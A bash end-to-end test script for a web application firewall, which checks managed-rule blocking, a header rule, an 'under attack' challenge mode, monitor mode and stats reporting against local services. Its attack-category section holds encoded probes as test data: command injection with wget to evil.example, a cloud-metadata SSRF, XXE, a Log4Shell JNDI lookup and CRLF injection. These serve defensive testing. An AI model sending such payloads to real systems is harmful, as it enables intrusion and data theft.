#!/usr/bin/env bash
# Advanced WAF E2E: new managed categories, header rules, security levels
# (including under-attack) and stats aggregation.
#
#   bash tests/integration/waf-advanced.sh
set -uo pipefail
source "$HOME/.cargo/env" 2>/dev/null || true

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$ROOT" || exit 1

CONTROL_PORT="${CONTROL_PORT:-18410}"
EDGE_PORT="${EDGE_PORT:-18411}"
ORIGIN_PORT="${ORIGIN_PORT:-19410}"
DOMAIN="waf-adv-$$.test"
LOG_DIR="${LOG_DIR:-/tmp/lagran-waf-adv}"
mkdir -p "$LOG_DIR"

PIDS=()
FAILED=0
TOKEN=""
DOMAIN_ID=""
HEADER_RULE=""

pass() { printf '  ok   %s\n' "$1"; }
fail() { printf '  FAIL %s\n' "$1"; FAILED=$((FAILED + 1)); }
check() { if [[ "$2" == "$3" ]]; then pass "$1"; else fail "$1 (got '$2', want '$3')"; fi; }
contains() { if [[ "$2" == *"$3"* ]]; then pass "$1"; else fail "$1 (missing '$3')"; fi; }

cleanup() {
  if [[ -n "$TOKEN" && -n "$DOMAIN_ID" ]]; then
    curl -s -X DELETE "http://127.0.0.1:$CONTROL_PORT/api/v1/domains/$DOMAIN_ID" \
      -H "authorization: Bearer $TOKEN" >/dev/null 2>&1
  fi
  for pid in "${PIDS[@]:-}"; do kill "$pid" 2>/dev/null; done
  wait 2>/dev/null
}
trap cleanup EXIT

api() { curl -s -H "authorization: Bearer $TOKEN" -H 'content-type: application/json' "$@"; }
hdr() { tr -d '\r' <"$LOG_DIR/h" | awk -F': ' -v k="$1" 'tolower($1)==k{print $2}' | head -1; }

get() {
  local path=$1
  shift
  curl -s -H "Host: $DOMAIN" "$@" -D "$LOG_DIR/h" -o "$LOG_DIR/b" -w '%{http_code}' \
    "http://127.0.0.1:$EDGE_PORT$path"
}

echo "== build mock origin =="
MOCK_BIN="$ROOT/target/mock-origin"
if [[ ! -x "$MOCK_BIN" || tools/mock-origin/origin.rs -nt "$MOCK_BIN" ]]; then
  rustc -O tools/mock-origin/origin.rs -o "$MOCK_BIN" || { echo "mock origin build failed"; exit 1; }
fi
"$MOCK_BIN" "$ORIGIN_PORT" >"$LOG_DIR/origin.log" 2>&1 &
PIDS+=($!)

echo "== start control =="
CONTROL_BIND="127.0.0.1:$CONTROL_PORT" AGENT_TOKEN= ./target/debug/lagran-control >"$LOG_DIR/control.log" 2>&1 &
PIDS+=($!)
for _ in $(seq 1 60); do curl -sf "http://127.0.0.1:$CONTROL_PORT/health" >/dev/null && break; sleep 0.5; done
curl -sf "http://127.0.0.1:$CONTROL_PORT/health" >/dev/null || { echo "control did not start"; exit 1; }

TOKEN=$(curl -s -X POST "http://127.0.0.1:$CONTROL_PORT/api/v1/auth/login" \
  -H 'content-type: application/json' \
  -d '{"email":"demo@lagran.dev","password":"demo123"}' | jq -r '.token // empty')
[[ -n "$TOKEN" ]] || { echo "login failed"; exit 1; }

api -X POST "http://127.0.0.1:$CONTROL_PORT/api/v1/domains" \
  -d "{\"name\":\"$DOMAIN\",\"origin_host\":\"127.0.0.1\",\"origin_port\":$ORIGIN_PORT,\"origin_proto\":\"http\"}" >/dev/null
DOMAIN_ID=$(api "http://127.0.0.1:$CONTROL_PORT/api/v1/domains" | jq -r --arg n "$DOMAIN" '.[] | select(.name == $n) | .id')
[[ -n "$DOMAIN_ID" ]] || { echo "domain creation failed"; exit 1; }

echo "== enable WAF =="
api -X PUT "http://127.0.0.1:$CONTROL_PORT/api/v1/domains/$DOMAIN_ID/waf" \
  -d '{"enabled":true,"mode":"block","security_level":"off","challenge_difficulty":2,"challenge_ttl_secs":300}' >/dev/null
SETTINGS=$(api "http://127.0.0.1:$CONTROL_PORT/api/v1/domains/$DOMAIN_ID/waf")
check "settings expose security_level" "$(printf '%s' "$SETTINGS" | jq -r '.security_level')" "off"
check "settings expose new managed category" "$(printf '%s' "$SETTINGS" | jq -r '.rce')" "true"

HEADER_RULE=$(api -X POST "http://127.0.0.1:$CONTROL_PORT/api/v1/domains/$DOMAIN_ID/waf/rules" \
  -d '{"name":"拦截坏密钥","field":"header:x-api-key","operator":"equals","value":"bad","action":"block","priority":20}' \
  | jq -r '.id')
[[ -n "$HEADER_RULE" ]] || { echo "header rule creation failed"; exit 1; }

echo "== start edge =="
CONTROL_URL="http://127.0.0.1:$CONTROL_PORT" \
NODE_ID="waf-adv-edge-$$" \
EDGE_LISTEN="127.0.0.1:$EDGE_PORT" \
ORIGIN_URL="http://127.0.0.1:$ORIGIN_PORT" \
WAF_REPORT_INTERVAL=2 \
CACHE_BACKEND=memory \
./target/debug/lagran-edge >"$LOG_DIR/edge.log" 2>&1 &
PIDS+=($!)
for _ in $(seq 1 60); do curl -sf "http://127.0.0.1:$EDGE_PORT/__lagran/health" >/dev/null && break; sleep 0.5; done

SYNCED=0
for _ in $(seq 1 40); do
  CODE=$(get "/" -A 'Mozilla/5.0')
  [[ "$CODE" == "200" ]] && { SYNCED=1; break; }
  sleep 0.5
done
check "edge synced WAF config" "$SYNCED" "1"

echo "== new managed categories =="
declare -A ATTACKS=(
  [rce]="/x?c=%3Bwget%20http%3A%2F%2Fevil.example%2Fx"
  [ssrf]="/x?u=http%3A%2F%2F169.254.169.254%2Fmeta"
  [xxe]="/x?d=%3C%21DOCTYPE%20x%20%5B%3C%21ENTITY"
  [log4shell]="/x?u=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%7D"
  [crlf]="/x?a=1%0d%0aSet-Cookie%3Ax"
)
for name in rce ssrf xxe log4shell crlf; do
  CODE=$(get "${ATTACKS[$name]}" -A 'Mozilla/5.0')
  check "$name blocked" "$CODE" "403"
done
contains "block page shown" "$(cat "$LOG_DIR/b")" "安全拦截"

echo "== header rule =="
CODE=$(get "/api/echo" -A 'Mozilla/5.0' -H 'x-api-key: bad')
check "header rule blocks bad key" "$CODE" "403"
CODE=$(get "/api/echo" -A 'Mozilla/5.0' -H 'x-api-key: good')
check "header rule ignores good key" "$CODE" "200"

echo "== security level: under attack =="
api -X PUT "http://127.0.0.1:$CONTROL_PORT/api/v1/domains/$DOMAIN_ID/waf" \
  -d '{"security_level":"under_attack"}' >/dev/null

CHALLENGED=0
for _ in $(seq 1 40); do
  CODE=$(get "/page" -A 'Mozilla/5.0' -H 'Accept: text/html')
  if [[ "$CODE" == "403" && "$(hdr x-lagran-challenge)" != "" ]]; then CHALLENGED=1; break; fi
  sleep 0.5
done
check "under-attack challenges documents" "$CHALLENGED" "1"
contains "challenge page marker" "$(cat "$LOG_DIR/b")" "正在进行安全验证"

CODE=$(get "/static/app.css" -A 'Mozilla/5.0' -H 'Accept: text/css')
check "static asset bypasses under-attack" "$CODE" "200"

# monitor mode must only log, not challenge
api -X PUT "http://127.0.0.1:$CONTROL_PORT/api/v1/domains/$DOMAIN_ID/waf" \
  -d '{"mode":"monitor"}' >/dev/null
MONITORED=0
for _ in $(seq 1 40); do
  CODE=$(get "/page" -A 'Mozilla/5.0' -H 'Accept: text/html')
  [[ "$CODE" == "200" ]] && { MONITORED=1; break; }
  sleep 0.5
done
check "monitor mode does not challenge" "$MONITORED" "1"

# back to block for stats/event clarity
api -X PUT "http://127.0.0.1:$CONTROL_PORT/api/v1/domains/$DOMAIN_ID/waf" \
  -d '{"mode":"block"}' >/dev/null

echo "== stats =="
sleep 3
STATS=$(api "http://127.0.0.1:$CONTROL_PORT/api/v1/waf/stats?domain=$DOMAIN&days=7")
TOTAL=$(printf '%s' "$STATS" | jq -r '.total')
if [[ "${TOTAL:-0}" -ge 6 ]]; then pass "stats total >= 6 ($TOTAL)"; else fail "stats total >= 6 (got ${TOTAL:-0})"; fi
for cat in rce ssrf xxe log4shell crlf security_level; do
  N=$(printf '%s' "$STATS" | jq -r --arg c "$cat" '[.by_category[] | select(.key == $c)][0].count // 0')
  if [[ "${N:-0}" -ge 1 ]]; then pass "stats has category $cat ($N)"; else fail "stats has category $cat"; fi
done
contains "stats has by_day buckets" "$STATS" '"by_day"'
contains "stats has top paths" "$STATS" '"top_paths"'

echo
if [[ "$FAILED" -eq 0 ]]; then
  echo "ALL ADVANCED WAF CHECKS PASSED"
else
  echo "$FAILED ADVANCED WAF CHECK(S) FAILED (logs: $LOG_DIR)"
  exit 1
fi
